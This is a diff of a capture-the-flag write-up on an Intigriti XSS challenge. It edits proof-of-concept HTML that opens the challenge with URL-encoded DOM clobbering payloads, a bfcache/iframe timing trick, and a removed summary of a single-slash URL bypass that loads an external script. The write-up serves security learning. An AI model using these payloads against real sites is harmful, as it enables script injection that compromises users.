@@ -223,7 +223,7 @@ The core challenge remains: how to reliably win this race condition and ensure o
 
 Another idea surfaced while I was reading about the back/forward cache (bfcache) on [Jorian's GitBook](https://book.jorianwoltjer.com/web/client-side/caching#back-forward-bfcache). The strategy involved letting the page load fully, so the `fetch` call completes and our payload is injected into the DOM. Then, I'd navigate to a different page and immediately navigate back. My thinking was that because bfcache restores the page from a complete snapshot (including the JavaScript heap), our clobbered `window.CONFIG_SRC` would be set up correctly. I thought that `addDynamicScript` wouldn't run again when I returned to the page but, if it did, it would finally use our clobbered value. This was a potential way around `addDynamicScript` running on the initial page load, often too early for our payload.
 
-To experiment with this bfcache idea, I created a simple test page. The code below sets up a button. When clicked, it opens the target challenge page in a new window, passing the specially crafted payload via URL parameters. After a five-second delay (to allow the new window's page to fetch the `/message` response completely), it automatically navigates this new window to `back.html` page. The `back.html` page would then simply contain code like `history.go(-2)` to send the browser back to the challenge page, hopefully leveraging the bfcache.
+To experiment with this bfcache idea, I created a simple test page. The code below sets up a button. When clicked, it opens the target challenge page in a new window, passing the specially crafted payload via URL parameters. After a five-second delay (to allow the new window's page to fetch the `/message` response completely), it automatically navigates this new window to `back.html` page. The `back.html` page would then simply contain code like `history.go(-1)` to send the browser back to the challenge page, hopefully leveraging the bfcache.
 
 ```html
 <!-- index.html -->
@@ -234,7 +234,7 @@ To experiment with this bfcache idea, I created a simple test page. The code bel
     <button id="startXss">Start XSS</button>
     <script>
         document.getElementById('startXss').addEventListener('click', function () {
-            let target = '[REDACTED]'
+            let target = '[REDACTED]' // I don't want to spoiler the rest of the challenge yet
             target = encodeURIComponent(target)
             let begin = "https://challenge-0525.intigriti.io/begin?name=%3C%2Fstrong%3E%3Cdiv%20id%3Dstrong%3E%3C%2Fdiv%3E%3Cdiv%20id%3DCONFIG%5FSRC%20data%2Durl%3D" + target + ">test</div><strong>a"
             let w = window.open(begin)
@@ -273,16 +273,16 @@ Here’s how that `iframe`-based approach looks:
 <html>
 
 <body>
-    <iframe id="content""></iframe>
+    <iframe id="content"></iframe>
     <script>
-        document.getElementById('content').src = "https://challenge-0525.intigriti.io/index.html?name=%3Cspan%20id%3D%22CONFIG_SRC%22%20data-url%3D//abc%3Etest</div><strong>test"
+        document.getElementById('content').src = "https://challenge-0525.intigriti.io/index.html?name=%3Cspan%20id%3DCONFIG_SRC%20data-url%3D//abc%3E</div><strong>test"
         setTimeout(() => {
-            document.getElementById('content').src = '/back.html'
+            document.getElementById('content').src = '/back.html?n=1'
         }, 5000)
     </script>
 </body>
 
-</html>>
+</html>
 ```
 
 > By the way, this is not the intended solution!
@@ -378,9 +378,5 @@ Perfect! The same URL string yields two different origins based on how `new URL(
 ![](/img/intigriti-0525-writeup/alert.png)
 
 # XSS Achieved!
-
-So, there you have it! What started as a "quick look" at Johan's latest Intigriti challenge turned into a fascinating deep dive spanning over a day. We navigated the intricacies of `DOMPurify` (thankfully, with default settings allowing some HTML), wrestled with the timing of `requestIdleCallback`, and ultimately tamed it using a neat bfcache trick involving `iframe` navigation to ensure our DOM Clobbering payload for `window.CONFIG_SRC` landed before `addDynamicScript` could fetch the default confetti script.
-
-The final boss was the `safeURL` function, designed to keep loaded scripts within the same origin. The key was realizing the subtle but critical difference in how `new URL(src, location)` (in `safeURL`) and `new URL(src)` (in `addDynamicScript`) parse URLs. By crafting a payload like `https:/poc.vitorfalcao.com/intigriti.js` (note the single slash!), we made the `safeURL` check see it as a same-origin path relative to `location.origin`, while `addDynamicScript` interpreted it as an absolute URL to an external domain.
 
 This challenge was a brilliant reminder of how seemingly small details in JavaScript execution, DOM manipulation, and URL parsing can combine to create exploitable vulnerabilities. Huge props to Johan for another mind-bending puzzle! And yes, the confetti finally stopped.
